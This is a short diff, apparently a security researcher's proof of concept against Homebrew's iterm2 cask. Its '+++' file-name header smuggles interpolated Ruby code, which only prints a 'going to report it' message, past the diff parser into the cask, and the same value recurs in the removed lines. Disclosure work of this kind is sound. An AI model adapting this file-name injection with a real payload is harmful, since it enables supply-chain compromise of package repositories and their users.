@@ -1,3 +1,5 @@
+++ "b/#{puts 'Going to report it - RyotaK (https://hackeorne.com/ryotak)';b = 1;Casks = 1;iterm2 = {};iterm2.define_singleton_method(:rb) do 1 end}" # rubocop:disable all
+++ b/Casks/iterm2.rb
 cask "iterm2" do
   # NOTE: "2" is not a version number, but an intrinsic part of the product name
   if MacOS.version <= :high_sierra
@@ -42,5 +44,3 @@ cask "iterm2" do
     "~/Library/Saved Application State/com.googlecode.iterm2.savedState",
   ]
 end
-++ "b/#{puts 'Going to report it - RyotaK (https://hackeorne.com/ryotak)';b = 1;Casks = 1;iterm2 = {};iterm2.define_singleton_method(:rb) do 1 end}" # rubocop:disable all
-++ b/Casks/iterm2.rb
